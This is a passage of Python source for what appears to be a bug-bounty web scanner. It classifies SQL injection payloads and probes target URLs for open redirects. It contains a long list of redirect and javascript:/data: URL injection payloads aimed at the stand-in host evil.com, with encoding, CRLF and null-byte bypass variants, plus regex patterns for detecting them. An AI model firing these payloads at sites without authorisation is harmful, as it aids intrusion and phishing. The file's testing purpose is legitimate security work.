    def determine_sql_type(self, payload):
        """Determine the type of SQL injection based on payload"""
        if 'UNION' in payload.upper():
            return 'Union-based SQL Injection'
        elif 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
            return 'Time-based Blind SQL Injection'
        elif '1=1' in payload or '1=2' in payload:
            return 'Boolean-based Blind SQL Injection'
        elif 'EXTRACTVALUE' in payload.upper() or 'CONCAT' in payload.upper():
            return 'Error-based SQL Injection'
        elif 'DROP' in payload.upper() or 'INSERT' in payload.upper() or 'UPDATE' in payload.upper():
            return 'Stacked Queries SQL Injection'
        else:
            return 'Basic SQL Injection'
    
    def scan_open_redirect(self, url, parameters):
        """
        Scan for Open Redirect vulnerabilities with advanced detection
        
        Args:
            url (str): Target URL
            parameters (list): List of parameters to test
        """
        self.log("Starting advanced Open Redirect vulnerability scan...", "INFO")
        
        # Advanced Open redirect payloads with unique identifiers
        redirect_payloads = [
            # External domains with unique identifiers
            "http://evil.com/redirect_bug_bounty_123",
            "https://evil.com/redirect_bug_bounty_123",
            "//evil.com/redirect_bug_bounty_123",
            "///evil.com/redirect_bug_bounty_123",
            "////evil.com/redirect_bug_bounty_123",
            
            # Protocol-relative URLs with unique identifiers
            "//google.com/redirect_bug_bounty_123",
            "//facebook.com/redirect_bug_bounty_123",
            "//twitter.com/redirect_bug_bounty_123",
            "//github.com/redirect_bug_bounty_123",
            "//youtube.com/redirect_bug_bounty_123",
            "//instagram.com/redirect_bug_bounty_123",
            "//linkedin.com/redirect_bug_bounty_123",
            "//reddit.com/redirect_bug_bounty_123",
            
            # URL encoding with unique identifiers
            "%2F%2Fevil.com%2Fredirect_bug_bounty_123",
            "%2F%2F%2Fevil.com%2Fredirect_bug_bounty_123",
            "%2F%2F%2F%2Fevil.com%2Fredirect_bug_bounty_123",
            
            # Double encoding with unique identifiers
            "%252F%252Fevil.com%252Fredirect_bug_bounty_123",
            "%252F%252F%252Fevil.com%252Fredirect_bug_bounty_123",
            
            # Mixed encoding with unique identifiers
            "/%2Fevil.com/redirect_bug_bounty_123",
            "/%252Fevil.com/redirect_bug_bounty_123",
            
            # JavaScript URLs with unique identifiers
            "javascript:alert('REDIRECT_BUG_BOUNTY_123')",
            "javascript:void(alert('REDIRECT_BUG_BOUNTY_123'))",
            "javascript:window.location='http://evil.com/redirect_bug_bounty_123'",
            "javascript:document.location='http://evil.com/redirect_bug_bounty_123'",
            "javascript:location.href='http://evil.com/redirect_bug_bounty_123'",
            
            # Data URLs with unique identifiers
            "data:text/html,<script>alert('REDIRECT_BUG_BOUNTY_123')</script>",
            "data:text/html,<meta http-equiv='refresh' content='0;url=http://evil.com/redirect_bug_bounty_123'>",
            "data:text/html,<script>window.location='http://evil.com/redirect_bug_bounty_123'</script>",
            
            # Meta refresh with unique identifiers
            "http://evil.com/redirect_bug_bounty_123",
            "https://evil.com/redirect_bug_bounty_123",
            
            # Relative paths that could be exploited with unique identifiers
            "../../../evil.com/redirect_bug_bounty_123",
            "..\\..\\..\\evil.com\\redirect_bug_bounty_123",
            "../../../../evil.com/redirect_bug_bounty_123",
            "..\\..\\..\\..\\evil.com\\redirect_bug_bounty_123",
            
            # Null byte injection with unique identifiers
            "http://evil.com/redirect_bug_bounty_123%00",
            "https://evil.com/redirect_bug_bounty_123%00",
            
            # CRLF injection with unique identifiers
            "http://evil.com/redirect_bug_bounty_123%0d%0a",
            "https://evil.com/redirect_bug_bounty_123%0d%0a",
            
            # Unicode with unique identifiers
            "http://evil.com/redirect_bug_bounty_123\u0000",
            "https://evil.com/redirect_bug_bounty_123\u0000",
            
            # Subdomain bypass with unique identifiers
            "http://evil.com.evil.com/redirect_bug_bounty_123",
            "https://evil.com.evil.com/redirect_bug_bounty_123",
            "http://evil.com@evil.com/redirect_bug_bounty_123",
            "https://evil.com@evil.com/redirect_bug_bounty_123",
            
            # Port bypass with unique identifiers
            "http://evil.com:80/redirect_bug_bounty_123",
            "https://evil.com:443/redirect_bug_bounty_123",
            "http://evil.com:8080/redirect_bug_bounty_123",
            
            # Path bypass with unique identifiers
            "http://evil.com/redirect_bug_bounty_123/",
            "https://evil.com/redirect_bug_bounty_123/",
            "http://evil.com/redirect_bug_bounty_123?",
            "https://evil.com/redirect_bug_bounty_123?",
            
            # Fragment bypass with unique identifiers
            "http://evil.com/redirect_bug_bounty_123#",
            "https://evil.com/redirect_bug_bounty_123#",
            
            # Query parameter bypass with unique identifiers
            "http://evil.com/redirect_bug_bounty_123?test=1",
            "https://evil.com/redirect_bug_bounty_123?test=1",
            
            # Advanced bypass techniques with unique identifiers
            "http://evil.com/redirect_bug_bounty_123?redirect=evil.com",
            "https://evil.com/redirect_bug_bounty_123?redirect=evil.com",
            "http://evil.com/redirect_bug_bounty_123?url=evil.com",
            "https://evil.com/redirect_bug_bounty_123?url=evil.com"
        ]
        
        # Common redirect parameter names
        redirect_params = [
            'redirect', 'redirect_to', 'redirect_url', 'redirect_uri', 'redirect_uri',
            'return', 'return_to', 'return_url', 'return_uri',
            'next', 'next_url', 'next_uri',
            'url', 'uri', 'link', 'href', 'src',
            'goto', 'go', 'target', 'destination',
            'continue', 'callback', 'success_url', 'failure_url',
            'login_redirect', 'logout_redirect', 'auth_redirect',
            'page', 'path', 'route', 'action',
            'forward', 'forward_to', 'forward_url',
            'jump', 'jump_to', 'jump_url',
            'move', 'move_to', 'move_url',
            'send', 'send_to', 'send_url',
            'transfer', 'transfer_to', 'transfer_url',
            'switch', 'switch_to', 'switch_url',
            'change', 'change_to', 'change_url',
            'update', 'update_to', 'update_url',
            'set', 'set_to', 'set_url',
            'load', 'load_to', 'load_url',
            'open', 'open_to', 'open_url',
            'view', 'view_to', 'view_url',
            'show', 'show_to', 'show_url',
            'display', 'display_to', 'display_url'
        ]
        
        # Test both provided parameters and common redirect parameters
        test_params = list(set(parameters + redirect_params))
        
        for param in tqdm(test_params, desc="Open Redirect Testing"):
            for payload in redirect_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5, allow_redirects=False)
                    
                    # Advanced Open Redirect confirmation
                    redirect_confirmed = self.confirm_open_redirect(response, payload, param)
                    
                    if redirect_confirmed['confirmed']:
                        vulnerability = {
                            'type': 'Open Redirect',
                            'subtype': redirect_confirmed['subtype'],
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': redirect_confirmed['severity'],
                            'description': f'{redirect_confirmed["subtype"]} found in parameter {param}',
                            'evidence': redirect_confirmed['evidence'],
                            'confidence': redirect_confirmed['confidence']
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"Open Redirect vulnerability confirmed in parameter: {param} (Confidence: {redirect_confirmed['confidence']}%)", "VULNERABILITY")
                
                except Exception as e:
                    continue
        
        self.log(f"Open Redirect scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'Open Redirect'])} confirmed vulnerabilities", "SUCCESS")
    
    def confirm_open_redirect(self, response, payload, parameter):
        """
        Advanced Open Redirect vulnerability confirmation with multiple validation methods
        
        Args:
            response: HTTP response object
            payload: Open redirect payload used
            parameter: Parameter name being tested
            
        Returns:
            dict: Confirmation result with details
        """
        confirmation_result = {
            'confirmed': False,
            'subtype': 'Unknown',
            'severity': 'Low',
            'confidence': 0,
            'evidence': '',
            'validation_methods': []
        }
        
        try:
            response_text = response.text
            confidence_score = 0
            validation_methods = []
            
            # Method 1: HTTP redirect header analysis (High confidence)
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                
                if self.is_external_redirect(location, payload):
                    confidence_score += 40
                    validation_methods.append('HTTP redirect header')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'HTTP Header Redirect'
                    confirmation_result['severity'] = 'Medium'
                    
                    # Check for unique identifier in redirect location
                    if 'redirect_bug_bounty_123' in location:
                        confidence_score += 20
                        validation_methods.append('Unique identifier in redirect location')
                        confirmation_result['severity'] = 'High'
            
            # Method 2: Meta refresh redirect detection (Medium confidence)
            meta_refresh_patterns = [
                r'<meta\s+http-equiv\s*=\s*["\']refresh["\']\s+content\s*=\s*["\']\d+;\s*url\s*=\s*([^"\']+)["\']',
                r'<meta\s+content\s*=\s*["\']\d+;\s*url\s*=\s*([^"\']+)["\']\s+http-equiv\s*=\s*["\']refresh["\']',
                r'<meta\s+http-equiv\s*=\s*["\']refresh["\']\s+content\s*=\s*["\']\d+;\s*URL\s*=\s*([^"\']+)["\']',
                r'<meta\s+content\s*=\s*["\']\d+;\s*URL\s*=\s*([^"\']+)["\']\s+http-equiv\s*=\s*["\']refresh["\']'
            ]
            
            for pattern in meta_refresh_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    if self.is_external_redirect(match, payload):
                        confidence_score += 30
                        validation_methods.append('Meta refresh redirect')
                        confirmation_result['confirmed'] = True
                        confirmation_result['subtype'] = 'Meta Refresh Redirect'
                        confirmation_result['severity'] = 'Medium'
                        
                        # Check for unique identifier
                        if 'redirect_bug_bounty_123' in match:
                            confidence_score += 15
                            validation_methods.append('Unique identifier in meta refresh')
                            confirmation_result['severity'] = 'High'
                        break
            
            # Method 3: JavaScript redirect detection (Medium confidence)
            js_redirect_patterns = [
                r'window\.location\s*=\s*["\']([^"\']+)["\']',
                r'location\.href\s*=\s*["\']([^"\']+)["\']',
                r'location\.replace\s*\(\s*["\']([^"\']+)["\']',
                r'document\.location\s*=\s*["\']([^"\']+)["\']',
                r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
                r'window\.location\.replace\s*\(\s*["\']([^"\']+)["\']',
                r'top\.location\s*=\s*["\']([^"\']+)["\']',
                r'parent\.location\s*=\s*["\']([^"\']+)["\']',
                r'self\.location\s*=\s*["\']([^"\']+)["\']'
            ]
            
            for pattern in js_redirect_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    if self.is_external_redirect(match, payload):
                        confidence_score += 25
                        validation_methods.append('JavaScript redirect')
                        confirmation_result['confirmed'] = True
                        confirmation_result['subtype'] = 'JavaScript Redirect'
                        confirmation_result['severity'] = 'Medium'
                        
                        # Check for unique identifier
                        if 'redirect_bug_bounty_123' in match:
                            confidence_score += 15
                            validation_methods.append('Unique identifier in JavaScript redirect')
                            confirmation_result['severity'] = 'High'
                        break
            
            # Method 4: Data URL redirect detection (Medium confidence)
            data_url_patterns = [
                r'data\s*:\s*text/html\s*,\s*<script>window\.location\s*=\s*["\']([^"\']+)["\']',
                r'data\s*:\s*text/html\s*,\s*<script>location\.href\s*=\s*["\']([^"\']+)["\']',
                r'data\s*:\s*text/html\s*,\s*<meta\s+http-equiv\s*=\s*["\']refresh["\']\s+content\s*=\s*["\']\d+;\s*url\s*=\s*([^"\']+)["\']'
            ]
            
            for pattern in data_url_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    if self.is_external_redirect(match, payload):
                        confidence_score += 25
                        validation_methods.append('Data URL redirect')
                        confirmation_result['confirmed'] = True
                        confirmation_result['subtype'] = 'Data URL Redirect'
                        confirmation_result['severity'] = 'Medium'
                        break
            
            # Method 5: JavaScript URL detection (High confidence)
            if payload.startswith('javascript:'):
                js_url_patterns = [
                    r'javascript\s*:\s*alert\s*\(\s*[\'"]REDIRECT_BUG_BOUNTY_123[\'"]\s*\)',
                    r'javascript\s*:\s*void\s*\(\s*alert\s*\(\s*[\'"]REDIRECT_BUG_BOUNTY_123[\'"]\s*\)\s*\)',
                    r'javascript\s*:\s*window\.location\s*=\s*[\'"]http://evil\.com/redirect_bug_bounty_123[\'"]',
                    r'javascript\s*:\s*document\.location\s*=\s*[\'"]http://evil\.com/redirect_bug_bounty_123[\'"]',
                    r'javascript\s*:\s*location\.href\s*=\s*[\'"]http://evil\.com/redirect_bug_bounty_123[\'"]'
                ]
                
                for pattern in js_url_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        confidence_score += 35
                        validation_methods.append('JavaScript URL execution')
                        confirmation_result['confirmed'] = True
                        confirmation_result['subtype'] = 'JavaScript URL Redirect'
                        confirmation_result['severity'] = 'High'
                        break
            
            # Method 6: Unique identifier detection (High confidence)
            if 'redirect_bug_bounty_123' in response_text:
                confidence_score += 30
                validation_methods.append('Unique identifier reflection')
                confirmation_result['confirmed'] = True
                if not confirmation_result['subtype']:
                    confirmation_result['subtype'] = 'Parameter-based Redirect'
                    confirmation_result['severity'] = 'Medium'
            
            # Method 7: Response content analysis
            if 'REDIRECT_BUG_BOUNTY_123' in response_text:
                confidence_score += 25
                validation_methods.append('Unique identifier in response content')
                confirmation_result['confirmed'] = True
                if not confirmation_result['subtype']:
                    confirmation_result['subtype'] = 'Content-based Redirect'
                    confirmation_result['severity'] = 'Medium'
            
            # Method 8: Parameter reflection analysis
            if parameter in response_text and 'redirect_bug_bounty_123' in response_text:
                param_reflection_pattern = rf'{re.escape(parameter)}\s*=\s*[^&]*redirect_bug_bounty_123'
                if re.search(param_reflection_pattern, response_text, re.IGNORECASE):
                    confidence_score += 20
                    validation_methods.append('Parameter reflection without validation')
                    confirmation_result['confirmed'] = True
                    if not confirmation_result['subtype']:
                        confirmation_result['subtype'] = 'Unvalidated Parameter Redirect'
                        confirmation_result['severity'] = 'Medium'
            
            # Method 9: Response size analysis
            if len(response_text) > 1000 and confirmation_result['confirmed']:
                confidence_score += 5
                validation_methods.append('Large response size')
            
            # Method 10: Content-Type analysis
            content_type = response.headers.get('Content-Type', '').lower()
            if 'text/html' in content_type and confirmation_result['confirmed']:
                confidence_score += 5
                validation_methods.append('HTML content type')
            
            # Set final confidence and evidence
            confirmation_result['confidence'] = min(confidence_score, 100)
            confirmation_result['validation_methods'] = validation_methods
            
            if confirmation_result['confirmed']:
                evidence_parts = []
                if 'redirect_bug_bounty_123' in response_text:
                    evidence_parts.append('Unique identifier found in response')
                if validation_methods:
                    evidence_parts.append(f'Validated by: {", ".join(validation_methods)}')
                if confirmation_result['confidence'] >= 70:
                    evidence_parts.append('High confidence detection')
                
                confirmation_result['evidence'] = '; '.join(evidence_parts)
            
            return confirmation_result
            
        except Exception as e:
            self.log(f"Error in Open Redirect confirmation: {e}", "WARNING")
            return confirmation_result
    
    def is_external_redirect(self, location, payload):
        """Check if redirect location is external"""
        try:
            if not location:
                return False
            
            # Parse the location URL
            parsed_location = urlparse(location)
            parsed_payload = urlparse(payload)
            
            # Check if it's an external domain
            if parsed_location.netloc and parsed_location.netloc != urlparse(self.target_url).netloc:
                return True
            
            # Check if payload domain appears in location
            if parsed_payload.netloc and parsed_payload.netloc in location:
                return True
            
            # Check for protocol-relative URLs
            if location.startswith('//'):
                return True
            
            # Check for JavaScript URLs
            if location.startswith('javascript:'):
                return True
            
            # Check for data URLs
            if location.startswith('data:'):
                return True
            
            return False
        except:
            return False
    
    def run_complete_scan(self, parameters):
        """
        Run complete vulnerability scan
        
        Args:
            parameters (list): List of parameters to test
        """
        self.log("Starting complete vulnerability scan...", "CRITICAL")
        
        try:
            # Scan for XSS
            self.scan_xss(self.target_url, parameters)
            
            # Scan for SQL Injection
            self.scan_sql_injection(self.target_url, parameters)
            
            # Scan for Open Redirect
            self.scan_open_redirect(self.target_url, parameters)
            
            # Save results
            self.save_vulnerabilities()
            
            self.log(f"Vulnerability scan completed! Found {len(self.vulnerabilities)} total vulnerabilities", "SUCCESS")
            return self.vulnerabilities
            
        except Exception as e:
            self.log(f"Error during vulnerability scan: {e}", "ERROR")
            return None

if __name__ == "__main__":
    # Example usage
    target = input("Enter target URL: ").strip()
    if target:
        scanner = BugScanner(target)
        # Example parameters - in real usage, these would come from reconnaissance
        example_params = ['id', 'page', 'search', 'q', 'url', 'redirect', 'return']
        vulnerabilities = scanner.run_complete_scan(example_params)
        if vulnerabilities:
            print(f"\n{Fore.GREEN}Scan completed! Found {len(vulnerabilities)} vulnerabilities.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Please provide a valid target URL.{Style.RESET_ALL}")